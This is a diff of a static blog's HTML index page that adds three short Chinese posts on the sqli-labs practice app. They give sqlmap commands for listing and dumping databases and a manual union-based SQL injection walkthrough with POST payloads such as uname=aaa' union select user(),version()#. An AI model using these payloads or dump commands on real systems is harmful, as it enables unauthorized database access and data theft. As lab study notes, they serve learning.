@@ -71,6 +71,137 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-12" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/24/page-12/" class="article-date">
+  <time class="dt-published" datetime="2021-01-24T09:38:47.000Z" itemprop="datePublished">2021-01-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/24/page-12/">sqlmap注入前十关</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>1-10 sqlmap.py -u “      “ –current-db 或者dbs 获取所有数据库<br>sqlmap.py -u “      “ -D （输入current获取到的）–tables<br>sqlmap.py -u “      “  -D （输入current获取到的）-T （tables获取到的） –columns </p>
+<p>sqlmap.py -u “      “  -D （输入current获取到的）-T （tables获取到的） -C (columns获得的) –dump</p>
+<p>然后第十关提高一下level –level 2 </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/24/page-12/" data-id="cksyl7wj5000gw4w7dw844po0" data-title="sqlmap注入前十关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-11" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/24/page-11/" class="article-date">
+  <time class="dt-published" datetime="2021-01-24T09:35:33.000Z" itemprop="datePublished">2021-01-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/24/page-11/">page十一关手动注入 十二也可以</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>先判断注入类型 </p>
+<p>用火狐下载个插件hackbar </p>
+<p>然后 post data那边输入 uname=admin（这个后面输入一个符号之类的判断注入类型）#&amp;passwd=admin&amp;submit=Submit （十二关是双引号 就加上“））</p>
+<p>这关的就有提示单引号注入 那么uname=admin’ #&amp;passwd=admin&amp;submit=Submit 输入这段</p>
+<p>登陆成功  然后uname=admin’  order by 2（这个数字可以慢慢试看到多少的时候显示登陆错误）#&amp;passwd=admin&amp;submit=Submit 这个是用来的出显示位数的</p>
+<p>接下来使用联合查询语句 union select 来进行爆破，使用union select的时候要注意，输入的unname必须是一个不存在的，，否则将会输出不出来</p>
+<p>uname=aaa’ union select 1,2#&amp;passwd=admin&amp;submit=Submit 比如这样子</p>
+<p>uname=aaa’ union select user(),version() #&amp;passwd=admin&amp;submit=Submit这句爆出使用者和数据库版本</p>
+<p>之后操作就和第一关是一样的都是那些语句</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/24/page-11/" data-id="cksyl7wj5000fw4w74d377e38" data-title="page十一关手动注入 十二也可以" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-9" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/22/page-9/" class="article-date">
+  <time class="dt-published" datetime="2021-01-22T12:27:10.000Z" itemprop="datePublished">2021-01-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/22/page-9/">sqlmap抓包功能</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>a老样子 win+r cmd sqlmap.py -u “想抓哪关的包的地址例如：<a target="_blank" rel="noopener" href="http://localhost/sqli-labs/Less-11/&quot;">http://localhost/sqli-labs/Less-11/&quot;</a> –forms  –thread 10 -dbs  </p>
+<p>这个会出现一句话例如这样Edit POST data [default: uname=&amp;passwd=&amp;submit=Submit] (Warning: blank fields detected):</p>
+<p>按照上面的要求就在后面输入 uname=aaa（随便）&amp;passwd=aaa（随便）&amp;submit=Submit</p>
+<p>也可选择默认方式后面加个–batch</p>
+<p>这速度也挺快的</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/22/page-9/" data-id="cksyl7wk40027w4w7hyvb0g0f" data-title="sqlmap抓包功能" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-8" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/01/20/page-8/" class="article-date">
@@ -587,23 +718,23 @@ echo "Have a good night!";
       <ul>
         
           <li>
+            <a href="/2021/09/22/page-121/">GYCTF2020Easyphp</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/22/page-120/">红明谷CTF 2021write shell</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/22/page-119/">page</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/22/page-118/">长城杯flag保熟</a>
           </li>
         
           <li>
             <a href="/2021/09/22/page-117/">第五空间misc</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/19/page-116/">第五空间WEBFTP pklovecloud</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/09/page-115/">又是misc</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/09/page-114/">page</a>
           </li>
         
       </ul>
